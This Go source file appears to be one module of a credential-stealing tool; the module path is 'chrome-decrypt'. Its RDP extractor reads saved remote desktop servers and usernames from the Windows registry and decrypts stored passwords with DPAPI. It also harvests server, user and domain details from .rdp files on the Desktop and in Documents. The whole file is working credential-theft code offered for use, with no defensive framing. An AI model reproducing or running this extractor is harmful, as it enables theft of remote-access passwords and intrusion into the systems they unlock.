package rdp

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"chrome-decrypt/pkg/credentials"
	"golang.org/x/sys/windows/registry"
)

// Windows API for DPAPI
var (
	crypt32            = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
	procLocalFree      = syscall.NewLazyDLL("kernel32.dll").NewProc("LocalFree")
)

// DPAPI structures
type dataBlob struct {
	cbData uint32
	pbData *byte
}

// Extractor implements the credentials.Extractor interface
type Extractor struct {
	verbose bool
}

// NewExtractor creates a new RDP extractor
func NewExtractor(verbose bool) *Extractor {
	return &Extractor{verbose: verbose}
}

// Extract extracts saved RDP connection passwords
func (e *Extractor) Extract() (interface{}, error) {
	if e.verbose {
		fmt.Println("[*] Extracting RDP passwords...")
	}

	var rdpConnections []credentials.RDPConnection

	// Extract from registry
	if regConnections := e.extractFromRegistry(); len(regConnections) > 0 {
		rdpConnections = append(rdpConnections, regConnections...)
	}

	// Extract from RDP files
	if fileConnections := e.extractFromRDPFiles(); len(fileConnections) > 0 {
		rdpConnections = append(rdpConnections, fileConnections...)
	}

	if e.verbose {
		fmt.Printf("[+] Found %d RDP connections\n", len(rdpConnections))
	}
	return rdpConnections, nil
}

// GetType returns the extractor type
func (e *Extractor) GetType() string {
	return "rdp_connections"
}

// extractFromRegistry extracts RDP connections from Windows registry
func (e *Extractor) extractFromRegistry() []credentials.RDPConnection {
	var connections []credentials.RDPConnection

	// Check Terminal Server Client registry
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Terminal Server Client\Servers`, registry.READ)
	if err != nil {
		return connections
	}
	defer key.Close()

	servers, err := key.ReadSubKeyNames(-1)
	if err != nil {
		return connections
	}

	for _, server := range servers {
		serverKey, err := registry.OpenKey(key, server, registry.READ)
		if err != nil {
			continue
		}

		connection := credentials.RDPConnection{
			Server: server,
		}

		if username, _, err := serverKey.GetStringValue("UsernameHint"); err == nil {
			connection.Username = username
		}

		// Try to get encrypted password
		if passwordData, _, err := serverKey.GetBinaryValue("Password"); err == nil {
			if decrypted := e.dpapiDecrypt(passwordData); decrypted != nil {
				connection.Password = string(decrypted)
			}
		}

		connections = append(connections, connection)
		serverKey.Close()
	}

	return connections
}

// extractFromRDPFiles extracts RDP connections from .rdp files
func (e *Extractor) extractFromRDPFiles() []credentials.RDPConnection {
	var connections []credentials.RDPConnection

	userHome := os.Getenv("USERPROFILE")
	documentsPath := filepath.Join(userHome, "Documents")

	// Look for .rdp files in Documents and Desktop
	searchPaths := []string{
		documentsPath,
		filepath.Join(userHome, "Desktop"),
	}

	for _, searchPath := range searchPaths {
		if files, err := os.ReadDir(searchPath); err == nil {
			for _, file := range files {
				if strings.HasSuffix(strings.ToLower(file.Name()), ".rdp") {
					rdpPath := filepath.Join(searchPath, file.Name())
					if connection := e.parseRDPFile(rdpPath); connection.Server != "" {
						connections = append(connections, connection)
					}
				}
			}
		}
	}

	return connections
}

// parseRDPFile parses an RDP file and extracts connection details
func (e *Extractor) parseRDPFile(filePath string) credentials.RDPConnection {
	connection := credentials.RDPConnection{}

	data, err := os.ReadFile(filePath)
	if err != nil {
		return connection
	}

	content := string(data)
	lines := strings.Split(content, "\n")

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.Contains(line, ":") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				key := strings.TrimSpace(parts[0])
				value := strings.TrimSpace(parts[1])

				switch key {
				case "full address":
					if strings.Contains(value, "s:") {
						connection.Server = strings.TrimPrefix(value, "s:")
					}
				case "username":
					if strings.Contains(value, "s:") {
						connection.Username = strings.TrimPrefix(value, "s:")
					}
				case "domain":
					if strings.Contains(value, "s:") {
						connection.Domain = strings.TrimPrefix(value, "s:")
					}
				}
			}
		}
	}

	return connection
}

// dpapiDecrypt decrypts data using Windows DPAPI
func (e *Extractor) dpapiDecrypt(data []byte) []byte {
	if len(data) == 0 {
		return nil
	}

	var outBlob dataBlob
	inBlob := dataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}

	ret, _, _ := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if ret == 0 {
		return nil
	}

	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))

	decrypted := make([]byte, outBlob.cbData)
	copy(decrypted, (*[1 << 20]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData:outBlob.cbData])

	return decrypted
}
